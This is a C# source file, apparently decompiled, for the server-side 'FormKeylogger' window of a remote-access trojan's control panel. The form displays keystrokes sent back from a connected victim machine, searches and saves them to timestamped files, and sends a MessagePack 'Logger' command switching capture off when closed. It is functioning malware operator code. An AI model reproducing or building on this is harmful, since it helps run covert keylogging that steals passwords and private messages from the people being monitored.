using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using DarkUI.Controls;
using DarkUI.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x0200005E RID: 94
	public partial class FormKeylogger : DarkForm
	{
		// Token: 0x0600039B RID: 923 RVA: 0x00024200 File Offset: 0x00024200
		public FormKeylogger()
		{
			this.InitializeComponent();
		}

		// Token: 0x170000A3 RID: 163
		// (get) Token: 0x0600039C RID: 924 RVA: 0x0002421C File Offset: 0x0002421C
		// (set) Token: 0x0600039D RID: 925 RVA: 0x00024224 File Offset: 0x00024224
		public global::Form1 F { get; set; }

		// Token: 0x170000A4 RID: 164
		// (get) Token: 0x0600039E RID: 926 RVA: 0x00024230 File Offset: 0x00024230
		// (set) Token: 0x0600039F RID: 927 RVA: 0x00024238 File Offset: 0x00024238
		internal Clients Client { get; set; }

		// Token: 0x170000A5 RID: 165
		// (get) Token: 0x060003A0 RID: 928 RVA: 0x00024244 File Offset: 0x00024244
		// (set) Token: 0x060003A1 RID: 929 RVA: 0x0002424C File Offset: 0x0002424C
		public string FullPath { get; set; }

		// Token: 0x060003A2 RID: 930 RVA: 0x00024258 File Offset: 0x00024258
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x060003A3 RID: 931 RVA: 0x000242A4 File Offset: 0x000242A4
		private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
		{
			StringBuilder sb = this.Sb;
			if (sb != null)
			{
				sb.Clear();
			}
			if (this.Client != null)
			{
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "Logger";
					msgPack.ForcePathObject("isON").AsString = "false";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				});
			}
		}

		// Token: 0x060003A4 RID: 932 RVA: 0x000242DC File Offset: 0x000242DC
		private void ToolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			this.richTextBox1.SelectionStart = 0;
			this.richTextBox1.SelectAll();
			this.richTextBox1.SelectionBackColor = Color.White;
			if (e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.toolStripTextBox1.Text))
			{
				int num;
				for (int i = 0; i < this.richTextBox1.TextLength; i += num + this.toolStripTextBox1.Text.Length)
				{
					num = this.richTextBox1.Find(this.toolStripTextBox1.Text, i, RichTextBoxFinds.None);
					if (num == -1)
					{
						break;
					}
					this.richTextBox1.SelectionStart = num;
					this.richTextBox1.SelectionLength = this.toolStripTextBox1.Text.Length;
					this.richTextBox1.SelectionBackColor = Color.Yellow;
				}
			}
		}

		// Token: 0x060003A5 RID: 933 RVA: 0x000243B8 File Offset: 0x000243B8
		private void ToolStripButton1_Click(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				File.WriteAllText(this.FullPath + "\\Keylogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", this.richTextBox1.Text.Replace("\n", Environment.NewLine));
			}
			catch
			{
			}
		}

		// Token: 0x0400026C RID: 620
		public StringBuilder Sb = new StringBuilder();
	}
}
